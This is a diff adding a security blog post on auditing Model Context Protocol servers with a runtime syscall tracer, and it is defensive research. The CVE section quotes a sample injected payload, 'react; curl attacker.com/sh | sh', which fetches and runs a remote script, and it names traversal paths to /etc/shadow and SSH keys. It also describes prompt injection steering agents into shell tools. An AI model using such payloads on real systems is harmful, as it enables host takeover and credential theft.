@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auditing Real-World MCP Servers with mcp-behave: A Ground-Truth Comparative Study — Navid Mirnouri</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/blog.css">
+
+    <meta name="description" content="Why static registry scanners fail and how dynamic syscall auditing catches unconstrained shell access and network egress in production Model Context Protocol servers. By Navid Mirnouri.">
+    <meta name="author" content="Navid Mirnouri">
+    <meta property="og:title" content="Auditing Real-World MCP Servers with mcp-behave: A Ground-Truth Comparative Study">
+    <meta property="og:description" content="Tool descriptions are marketing copy. Dynamic syscall tracing reveals the reality behind production MCP servers.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://navid72m.github.io/blog/auditing-mcp-servers-with-mcp-behave.html">
+    <link rel="canonical" href="https://navid72m.github.io/blog/auditing-mcp-servers-with-mcp-behave.html">
+    <link rel="alternate" type="application/rss+xml" title="Navid Mirnouri — Writing" href="/feed.xml">
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-NJ4XLD7F9K"></script>
+    <script data-goatcounter="https://navid72m.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-NJ4XLD7F9K');
+    </script>
+</head>
+<body>
+
+    <div class="trace-rail" aria-hidden="true">
+        <div class="trace-fill" id="trace-fill"></div>
+    </div>
+
+    <nav id="navbar">
+        <div class="nav-inner">
+            <a href="/" class="nav-logo"><span class="prompt">navid@systems</span>:~$</a>
+            <ul class="nav-links">
+                <li><a href="/#home">home</a></li>
+                <li><a href="/#stack">stack</a></li>
+                <li><a href="/#projects">projects</a></li>
+                <li><a href="/#research">research</a></li>
+                <li><a href="/#blog">writing</a></li>
+                <li><a href="/#contact">contact</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <header class="post-head">
+        <p class="doc-path"><a href="/#blog">~/writing</a>/auditing-mcp-servers-with-mcp-behave</p>
+        <span class="post-category">Agentic Engineering</span>
+        <h1>Auditing Real-World MCP Servers with mcp-behave: A Ground-Truth Comparative Study</h1>
+        <p class="post-tagline">Tool descriptions are marketing copy. Why static registry scanners fail and how dynamic syscall auditing catches unconstrained shell access and network egress in production Model Context Protocol servers.</p>
+        <div class="post-meta">
+            <span><i class="far fa-calendar-alt"></i> November 2026</span>
+            <span><i class="far fa-clock"></i> 10 min read</span>
+            <span><i class="fas fa-user"></i> Navid Mirnouri</span>
+        </div>
+        <div class="like-widget" data-slug="auditing-mcp-servers-with-mcp-behave">
+            <button class="like-btn" id="like-btn" aria-pressed="false">
+                <i class="far fa-heart"></i>
+                <span class="like-count">–</span>
+                <span>likes</span>
+            </button>
+        </div>
+    </header>
+
+    <article class="post-body">
+        <div class="abstract">
+            <div class="abstract-label">Abstract</div>
+            <p>The <strong>Model Context Protocol (MCP)</strong> has rapidly emerged as the universal standard connecting Large Language Models to local databases, shell tools, and APIs. But today's server verification relies almost exclusively on <strong>static schema analysis</strong> — linters and registries checking description strings and parameter types. That creates a catastrophic blind spot: static analysis inspects what a server <em>declares</em>, never what it <em>actually does</em> at runtime. In this study, we run <strong><code>mcp-behave</code></strong> — an open-source, non-invasive runtime behavioral tracer — against real-world production MCP servers published on PyPI: Anthropic's official <code>mcp-server-time</code> (the safe baseline), <code>mcp-server-fetch</code> (network egress), and <code>mcp-server-shell</code> (unconstrained subprocess execution). We show how dynamic syscall interception intercepts undeclared network sockets and raw shell launches (<code>/bin/sh</code>) without requiring root permissions, analyze real-world vulnerabilities like <strong>CVE-2025-54073</strong> and <strong>CVE-2025-53110</strong>, and outline why runtime verification is essential for agentic security.</p>
+        </div>
+
+        <h2>1. The Core Problem: The MCP Privilege Gap</h2>
+
+        <p>When a developer configures an MCP server in Claude Desktop, Cursor, or an autonomous CLI agent:</p>
+
+<pre><code>{
+  "mcpServers": {
+    "shell-helper": {
+      "command": "python",
+      "args": ["-m", "mcp_server_shell"]
+    }
+  }
+}</code></pre>
+
+        <p>That process does not run in a sandboxed browser environment or an isolated hypervisor by default. <strong>It executes locally with the developer's full operating system privileges.</strong> It inherits the developer's <code>$HOME</code> directory, SSH private keys in <code>~/.ssh</code>, cloud tokens in <code>~/.aws/credentials</code>, environment secrets (<code>.env</code>), and access to local network sockets.</p>
+
+        <p>In the MCP specification, servers communicate with the model over JSON-RPC via standard input/output or HTTP/SSE:</p>
+        <ul>
+            <li><code>tools/list</code>: Returns available tools, human-readable descriptions, and JSON Schemas.</li>
+            <li><code>tools/call</code>: Executes a tool with model-synthesized arguments.</li>
+        </ul>
+
+        <h3>Why Static Schema Auditing Fails</h3>
+
+        <p>Registry linters inspect the AST or the JSON manifest. They verify that types conform to JSON Schema Draft 7 and that docstrings are well-formed. However:</p>
+
+        <ol class="steps">
+            <li><strong>Zero Runtime Visibility:</strong> A tool declaring itself <em>"Purely local text formatting"</em> can quietly open an outbound TCP socket to an external server or read credentials off disk without changing its manifest.</li>
+            <li><strong>The Prompt-Injection Multiplier:</strong> While a developer might assume an execution tool will only be used when they explicitly ask for it, an autonomous agent reading an untrusted webpage, a pull request diff, or a poisoned document can be hijacked via <strong>indirect prompt injection</strong> to trigger tools with attacker-chosen arguments.</li>
+            <li><strong>The Rug-Pull Threat:</strong> An open-source package published as version <code>0.1.0</code> with clean, benign tools can release version <code>0.1.1</code> with unconstrained command execution or telemetry probes without altering existing tool signatures.</li>
+        </ol>
+
+        <div class="callout">
+            <div class="callout-title">The Fallacy of Declared Safety</div>
+            <p>Tool schemas and docstrings are marketing copy directed at the LLM planner. They provide zero programmatic guarantees about the system calls executed by the underlying runtime process.</p>
+        </div>
+
+        <h2>2. Architecture of mcp-behave</h2>
+
+        <p>To establish ground-truth observability without invasive kernel modules or root access, I built <strong><code>mcp-behave</code></strong>. It treats any MCP server as a black-box executable under test:</p>
+
+        <div class="formula-block">Target Server Command  ──▶  Runtime Tracer Injected (DYLD / LD_PRELOAD)
+         │
+         ▼
+Autonomous Probe Engine  ──▶  Query tools/list & resources/list
+         │
+         ▼
+Schema-Aware Canary Synthesis (RFC-reserved domains, min constraints, defaults)
+         │
+         ▼
+Dispatch tools/call over stdio  ──▶  Intercept libc calls (F=open, N=connect, X=exec)
+         │
+         ▼
+Differential Policy Analyzer  ──▶  Declared vs. Observed Verdict (Exit Code 0 vs >0)</div>
+
+        <h3>Key Technical Pillars</h3>
+        <ul>
+            <li><strong>Non-Invasive Syscall Interposition (No Root Required):</strong> On macOS, <code>mcp-behave</code> injects <code>libmcpbehave_trace.dylib</code> via <code>DYLD_INSERT_LIBRARIES</code>, interposing libc entry points (<code>open</code>, <code>openat</code>, <code>connect</code>, <code>execve</code>, <code>execv</code>, <code>posix_spawn</code>). On Linux, it injects <code>libmcpbehave_trace.so</code> via <code>LD_PRELOAD</code> (falling back to <code>strace</code>). Traces are written to a dedicated descriptor (<code>$MCP_BEHAVE_TRACE_FILE</code>), keeping stdout pristine for JSON-RPC traffic.</li>
+            <li><strong>Schema-Aware Canary Synthesis:</strong> The probe engine reads the server's live JSON Schema and generates valid inputs respecting <code>format</code> (URI, email, date-time), <code>minimum</code> boundaries, and <code>default</code> values, injecting canary strings (<code>canary-input</code>, <code>http://example.com/</code>, <code>/tmp/probe-canary.txt</code>).</li>
+            <li><strong>Differential Scope Analysis:</strong> Flags undeclared outbound network connects (elevated to <strong>HIGH</strong> severity if the tool description claims local/offline operation), detects reads to sensitive paths (<code>~/.ssh</code>, <code>.env</code>, <code>.aws</code>), alerts on subprocess launches, and checks cryptographic manifest hashes across runs to catch rug-pulls.</li>
+        </ul>
+
+        <h2>3. Auditing Real-World MCP Servers</h2>
+
+        <p>Rather than testing synthetic fixtures, we evaluated three publicly published packages from the Python Package Index (PyPI):</p>
+        <ol>
+            <li><code>mcp-server-time</code> (Anthropic Official Reference, v2026.11.11)</li>
+            <li><code>mcp-server-shell</code> (Community Terminal Helper, v0.1.0)</li>
+            <li><code>mcp-server-fetch</code> (Anthropic Official Reference, v2026.11.11)</li>
+        </ol>
+
+        <h3>Target A: The Safe Baseline (mcp-server-time)</h3>
+
+        <p>Anthropic's <code>mcp-server-time</code> provides local timezone and offset conversions across three tools: <code>get_current_time</code>, <code>convert_time</code>, and <code>get_time_ago</code>.</p>
+
+<pre><code>$ mcp-behave /tmp/audit_env/bin/mcp-server-time
+
+=== STEP 1: observe (macos-dylib) ===
+[probe] discovered 3 tool(s)
+[probe] calling tool get_current_time({"timezone": "Asia/Tehran"})
+[probe] calling tool convert_time({"source_timezone": "Asia/Tehran", "time": "canary-input", "target_timezone": "Asia/Tehran"})
+[probe] calling tool get_time_ago({"timezone": "Asia/Tehran", "days_ago": 0, "hours_ago": 0, "minutes_ago": 0, "seconds_ago": 0})
+[probe] manifest -> /tmp/mcp_behave_out/manifest.json
+[probe] trace    -> /tmp/mcp_behave_out/trace.log
+=== STEP 2: declared-vs-observed diff ===
+
+  target tools: get_current_time, convert_time, get_time_ago
+  resources:    0, prompts: 0
+  declared scope hints: none
+  --------------------------------------------------------
+  no declared-vs-observed deviations detected</code></pre>
+
+        <p>Inspecting <code>trace.log</code> reveals 572 total libc <code>open()</code> calls. 565 were filtered as standard runtime library noise (Python C-extensions and bytecode caches). The remaining 7 were legitimate OS timezone databases (<code>/etc/timezone</code>, <code>/var/db/zoneinfo</code>). Crucially:</p>
+        <ul>
+            <li><strong>Network Sockets:</strong> Exactly 0 (no <code>connect()</code> calls).</li>
+            <li><strong>Subprocesses:</strong> Exactly 0 (no <code>exec</code> / <code>posix_spawn</code> calls).</li>
+            <li><strong>Sensitive Files:</strong> Exactly 0 credential stores accessed.</li>
+            <li><strong>Verdict:</strong> <strong>PASS (Clean)</strong> with exit code 0.</li>
+        </ul>
+
+        <h3>Target B: The High-Risk Privileged Target (mcp-server-shell)</h3>
+
+        <p>Published on PyPI as <code>mcp-server-shell==0.1.0</code>, this server declares a single tool: <code>execute_command({"command": "string"})</code> with description <em>"Execute a shell command and return its output"</em>.</p>
+
+        <p>Inspecting the package's <code>server.py</code> reveals the underlying implementation:</p>
+
+<pre><code>class ShellServer:
+    def execute_command(self, command: str) -> CommandResult:
+        logger.info(f"Executing command: {command}")
+        result = subprocess.run(
+            command,
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+        return CommandResult(...)</code></pre>
+
+        <p>The server wraps Python's <code>subprocess.run(command, shell=True)</code> with zero input sanitization or sandboxing boundaries. Running <code>mcp-behave</code> against this live package:</p>
+
+<pre><code>$ mcp-behave /tmp/audit_env/bin/python -m mcp_server_shell
+
+=== STEP 1: observe (macos-dylib) ===
+[probe] discovered 1 tool(s)
+[probe] calling tool execute_command({"command": "canary-input"})
+2026-11-18 09:07:41,349 - INFO - Executing command: canary-input
+[probe] manifest -> /tmp/mcp_behave_out/manifest.json
+[probe] trace    -> /tmp/mcp_behave_out/trace.log
+=== STEP 2: declared-vs-observed diff ===
+
+  target tools: execute_command
+  resources:    0, prompts: 0
+  declared scope hints: none
+  --------------------------------------------------------
+  [i] INFO spawned subprocess: /bin/sh</code></pre>
+
+        <p>In <code>trace.log</code>, <code>mcp-behave</code> captured the raw process spawn: <code>X /bin/sh</code>. The tool immediately broke out of the Python interpreter into an unconstrained host shell session. Coupled with indirect prompt injection, this tool transforms any web or document read into arbitrary Remote Code Execution (RCE) on the developer's laptop.</p>
+
+        <h3>Target C: Auditing Network Egress in mcp-server-fetch</h3>
+
+        <p>To verify outbound network socket detection against production software, we audited Anthropic's official <code>mcp-server-fetch</code>:</p>
+
+<pre><code>$ mcp-behave /tmp/audit_env/bin/mcp-server-fetch --no-readability-js
+
+=== STEP 1: observe (macos-dylib) ===
+[probe] discovered 1 tool(s)
+[probe] calling tool fetch({"url": "http://example.com/", "max_length": 5000, "start_index": 0, "raw": false, "timeout_ms": 30000})
+HTTP Request: GET http://example.com/robots.txt "HTTP/1.1 404 Not Found"
+HTTP Request: GET http://example.com/ "HTTP/1.1 200 OK"
+[probe] manifest -> /tmp/mcp_behave_out/manifest.json
+[probe] trace    -> /tmp/mcp_behave_out/trace.log
+=== STEP 2: declared-vs-observed diff ===
+
+  target tools: fetch
+  resources:    0, prompts: 1
+  declared scope hints: none
+  --------------------------------------------------------
+  [i] INFO network egress to 172.66.147.243:80</code></pre>
+
+        <p>The tracer caught the live <code>connect()</code> syscall to remote socket <code>172.66.147.243:80</code>, demonstrating that runtime dynamic tracing captures outbound traffic without requiring packet sniffers or root privileges.</p>
+
+        <h2>4. Comparison Matrix: Empirical Audit Results</h2>
+
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Metric</th>
+                        <th>mcp-server-time</th>
+                        <th>mcp-server-fetch</th>
+                        <th>mcp-server-shell</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Origin</strong></td>
+                        <td>Anthropic Official (PyPI)</td>
+                        <td>Anthropic Official (PyPI)</td>
+                        <td>Community Package (PyPI)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Declared Scope</strong></td>
+                        <td>Date & Time utilities</td>
+                        <td>Web page fetch & Markdown</td>
+                        <td>Shell command execution</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Tools Probed</strong></td>
+                        <td>3 tools</td>
+                        <td>1 tool</td>
+                        <td>1 tool</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Observed File Opens</strong></td>
+                        <td>572 total (7 OS zoneinfo)</td>
+                        <td>610 total (SSL certs)</td>
+                        <td>593 total (system plists)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Observed Network</strong></td>
+                        <td><strong>0 sockets</strong></td>
+                        <td><strong>1 socket (172.66.147.243:80)</strong></td>
+                        <td><strong>0 sockets</strong></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Observed Subprocesses</strong></td>
+                        <td><strong>0</strong></td>
+                        <td><strong>0</strong></td>
+                        <td><strong>1 host shell (/bin/sh)</strong></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Sensitive Credentials</strong></td>
+                        <td><strong>None</strong></td>
+                        <td><strong>None</strong></td>
+                        <td><strong>Arbitrary via command input</strong></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Blast Radius</strong></td>
+                        <td>Zero (In-memory math)</td>
+                        <td>SSRF / Internal IP egress</td>
+                        <td>Full Host Compromise</td>
+                    </tr>
+                    <tr>
+                        <td><strong>mcp-behave Verdict</strong></td>
+                        <td>Clean Baseline (Exit 0)</td>
+                        <td>Egress Noted (Exit 0)</td>
+                        <td>Subprocess Alerted</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h2>5. Real-World CVE Analysis in the Ecosystem</h2>
+
+        <p>The security exposure demonstrated by <code>mcp-server-shell</code> is not theoretical. Across 2025 and 2026, critical vulnerabilities in published MCP servers demonstrated these exact attack paths:</p>
+
+        <h3>CVE-2025-54073: Remote Code Execution in mcp-package-docs (npm)</h3>
+        <p>An MCP server designed to fetch documentation for package managers passed package names directly into Node's <code>child_process.exec()</code> without sanitization. An attacker supplying a malicious payload in a README (e.g. <code>react; curl attacker.com/sh | sh</code>) achieved arbitrary command execution when the model queried the tool. Static scanners gave the package a clean grade because the tool schema simply declared <code>package_name: string</code>. Under <code>mcp-behave</code>, the tool's immediate spawn of <code>/bin/sh</code> is flagged on first exercise.</p>
+
+        <h3>CVE-2025-53110: Path Traversal in Filesystem MCP Servers</h3>
+        <p>Path traversal vulnerabilities allowed models to escape designated workspace directories using relative traversal sequences (<code>../../../../etc/shadow</code> or <code>../../.ssh/id_rsa</code>). <code>mcp-behave</code> continuously monitors <code>open()</code> and <code>openat()</code> calls against sensitive directory paths (<code>.ssh</code>, <code>id_rsa</code>, <code>.aws/credentials</code>, <code>.env</code>), triggering a <strong>HIGH</strong> severity alert whenever a sensitive credential path is opened.</p>
+
+        <h2>6. Engineering Deep-Dive: Tracing Subprocesses on macOS</h2>
+
+        <p>During our audit of Python-based MCP servers on macOS Apple Silicon, we encountered a critical systems-level challenge in tracing child processes:</p>
+
+        <p>When Python calls <code>subprocess.run(shell=True)</code>:</p>
+        <ol class="steps">
+            <li>Python invokes <code>_posixsubprocess.fork_exec()</code>.</li>
+            <li>In the forked child process, Python's runtime runs <code>close_open_fds()</code> to close all file descriptors above standard error (default <code>close_fds=True</code>).</li>
+            <li>This action immediately closed the tracer's active log descriptor (<code>g_trace_fd</code>) inside the child process.</li>
+            <li>When the subsequent <code>execv</code> or <code>execve</code> call fired, the write attempt failed silently with <code>EBADF</code>.</li>
+        </ol>
+
+        <p>To eliminate dropped events, we updated <code>macos_tracer.c</code> and <code>linux_tracer.c</code> to detect descriptor invalidation and re-open the trace file atomically on append:</p>
+
+<pre><code>static void emit(const char *buf, size_t len) {
+    if (g_trace_fd < 0) {
+        const char *path = getenv("MCP_BEHAVE_TRACE_FILE");
+        if (path && *path) g_trace_fd = open(path, O_WRONLY | O_APPEND | O_CREAT, 0600);
+    }
+    if (g_trace_fd < 0) return;
+    ssize_t w = write(g_trace_fd, buf, len);
+    if (w < 0) {
+        /* If write fails because child closed descriptors before exec, re-open */
+        const char *path = getenv("MCP_BEHAVE_TRACE_FILE");
+        if (path && *path) {
+            int fd = open(path, O_WRONLY | O_APPEND | O_CREAT, 0600);
+            if (fd >= 0) {
+                (void)!write(fd, buf, len);
+                g_trace_fd = fd;
+            }
+        }
+    }
+}</code></pre>
+
+        <p>This guarantees that every subprocess spawned by any runtime language (Python, Node.js, Go, Rust) is captured in the audit trace.</p>
+
+        <h2>7. Recommendations for the MCP Ecosystem</h2>
+
+        <p>As agentic AI transitions from experimental playgrounds to enterprise production, the trust model of tool connectivity must mature:</p>
+
+        <div class="reading-list">
+            <h3>Actionable Guidelines</h3>
+            <ul>
+                <li><strong>For Registries (Glama, Smithery, Official Registry):</strong> Integrate automated behavioral audits into ingestion CI pipelines. Replace cosmetic linting badges with verified behavioral facts: <em>0 network sockets observed</em>, <em>0 subprocesses spawned</em>, <em>strict path isolation verified</em>.</li>
+                <li><strong>For Enterprise Security Teams:</strong> Mandate behavioral audits before allowing third-party MCP servers onto developer laptops. Run <code>mcp-behave --json --fail-on high &lt;command&gt;</code> in pre-commit hooks.</li>
+                <li><strong>For MCP Authors:</strong> Implement explicit sandboxes, refuse shell expansion, and restrict network calls to declared domain allowlists.</li>
+            </ul>
+        </div>
+
+        <p>Static schema verification guarantees syntactic validity; it says nothing about runtime integrity. Before connecting your next MCP tool to Claude Desktop or Cursor, don't just read the schema. <strong>Audit what it actually does.</strong></p>
+
+        <div class="reading-list">
+            <h3>Project Resources</h3>
+            <ul>
+                <li><strong>mcp-behave Repository:</strong> <a href="https://github.com/navid72m/mcp-behave" target="_blank" style="color: #667eea;">github.com/navid72m/mcp-behave</a></li>
+                <li><strong>PyPI Package:</strong> <code>pip install mcp-behave</code></li>
+                <li><strong>Tested MCP Servers:</strong> <code>mcp-server-time</code>, <code>mcp-server-shell</code>, <code>mcp-server-fetch</code></li>
+            </ul>
+        </div>
+
+        <p class="disclaimer">If you're building or securing agentic tools and want to discuss behavioral sandboxing, feel free to reach out at <a href="mailto:navid72m@gmail.com">navid72m@gmail.com</a>.</p>
+
+        <div class="post-nav">
+            <a href="/#blog"><i class="fas fa-arrow-left"></i> Back to Writing</a>
+            <a href="/feed.xml"><i class="fas fa-rss"></i> RSS feed</a>
+            <a href="mailto:navid72m@gmail.com"><i class="fas fa-envelope"></i> Discuss via email</a>
+        </div>
+    </article>
+
+    <footer>
+        <p id="footer-year">&copy; 2026 <a href="/">Navid Mirnouri</a>.</p>
+    </footer>
+
+    <script src="/assets/likes.js"></script>
+    <script>
+        const navbar = document.getElementById('navbar');
+        window.addEventListener('scroll', () => {
+            navbar.classList.toggle('scrolled', window.scrollY > 40);
+
+            const traceFill = document.getElementById('trace-fill');
+            const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
+            const scrolled = scrollHeight > 0 ? (window.scrollY / scrollHeight) * 100 : 0;
+            traceFill.style.height = scrolled + '%';
+        });
+
+        document.getElementById('footer-year').textContent = `© ${new Date().getFullYear()} Navid Mirnouri.`;
+    </script>
+</body>
+</html>
